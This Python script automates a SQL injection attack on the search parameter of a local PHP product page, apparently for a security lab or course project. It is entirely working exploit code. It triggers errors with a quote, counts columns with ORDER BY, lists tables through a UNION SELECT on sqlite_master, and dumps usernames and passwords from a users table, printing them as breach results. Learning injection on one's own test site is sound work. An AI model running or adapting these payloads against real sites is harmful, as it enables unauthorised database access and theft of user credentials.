import requests
from bs4 import BeautifulSoup
import time

# --- Configuration ---
BASE_URL = "http://localhost/CyberProject" 
PRODUCTS_URL = f"{BASE_URL}/products.php"

# !IMPORTANT!: Update this with your actual PHPSESSID from the browser
# (F12 -> Application -> Cookies -> localhost)
COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'}

def print_step(title, payload, explanation):
    print(f"\n\033[1;34m[STEP]: {title}\033[0m")
    print(f"\033[1;32m[PAYLOAD]:\033[0m {payload}")
    print(f"\033[1;33m[EXPLANATION]:\033[0m {explanation}")
    print("-" * 60)
    time.sleep(0.5)

def check_for_error(html):
    # Detect SQL errors or PHP crashes
    return "SQL Error" in html or "Fatal error" in html or "exception" in html.lower()

# ==========================================
# Script Start
# ==========================================

# --- Step 1: Sanity Check ---
# We use %' to break the LIKE syntax syntax properly
print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
res = requests.get(PRODUCTS_URL, params={'q': "%'"}, cookies=COOKIES)

if check_for_error(res.text):
    print("[!] Success! The server returned an SQL error.")
else:
    print("[-] No error returned. Check if the Session ID is valid and the site is running.")
    # exit() # Optional: stop here if failed

# --- Step 2: Determine Column Count ---
detected_cols = 0
print_step("Enumeration - Column Count", "%' ORDER BY X --", "Incrementing ORDER BY until the page breaks.")

for i in range(1, 10):
    # Payload: Close the LIKE clause, then ORDER BY
    payload = f"%' ORDER BY {i} --"
    res = requests.get(PRODUCTS_URL, params={'q': payload}, cookies=COOKIES)
    
    if check_for_error(res.text):
        detected_cols = i - 1
        print(f"[!] Error at ORDER BY {i}. Conclusion: The table has {detected_cols} columns.")
        break
    else:
        print(f"[*] Column {i} exists...")

if detected_cols == 0:
    print("[-] Failed to detect column count. Defaulting to 5.")
    detected_cols = 5

# --- Step 3: Extract Table Names from sqlite_master ---
# We need to construct a UNION with NULLs for all columns except the visible one (column 2)
# In SQLite, the metadata table is called 'sqlite_master'
union_cols = ["NULL"] * detected_cols
union_cols[1] = "name" # Display table name in the product name slot
columns_str = ", ".join(union_cols)

# Start with ZZZ to ensure no real products are shown, only injected data
payload_tables = f"ZZZ%' UNION SELECT {columns_str} FROM sqlite_master WHERE type='table' --"

print_step("Extracting Table Names", payload_tables, "Querying sqlite_master for table names.")
res = requests.get(PRODUCTS_URL, params={'q': payload_tables}, cookies=COOKIES)
soup = BeautifulSoup(res.text, 'html.parser')

# Find all product name elements (which now contain table names)
found_elements = soup.find_all('div', class_='product-name')
tables = [el.get_text(strip=True) for el in found_elements]

print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")

# --- Step 4: Dump Users and Passwords ---
if 'users' in tables:
    # Target the 'users' table
    # Show 'username' in column 2 (Product Name) and 'password' in column 3 (Price)
    
    target_cols = ["NULL"] * detected_cols
    target_cols[1] = "username" # Title
    target_cols[2] = "password" # Price slot
    target_str = ", ".join(target_cols)
    
    payload_users = f"ZZZ%' UNION SELECT {target_str} FROM users --"
    
    print_step("Data Dump - Sensitive Information", payload_users, "Extracting usernames and passwords from 'users' table.")
    res = requests.get(PRODUCTS_URL, params={'q': payload_users}, cookies=COOKIES)
    soup = BeautifulSoup(res.text, 'html.parser')
    
    cards = soup.find_all('article', class_='product-card')
    
    print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
    for card in cards:
        name_div = card.find('div', class_='product-name')
        price_div = card.find('div', class_='product-price')
        
        if name_div and price_div:
            u = name_div.get_text(strip=True)
            # Remove the currency symbol added by the HTML
            p = price_div.get_text(strip=True).replace('₪', '').strip() 
            
            # Filter out empty results
            if u:
                print(f"[*] User: {u:<15} | Password: {p}")
                
else:
    print("[-] 'users' table not found, cannot dump passwords.")

print("\n--- Script Finished ---")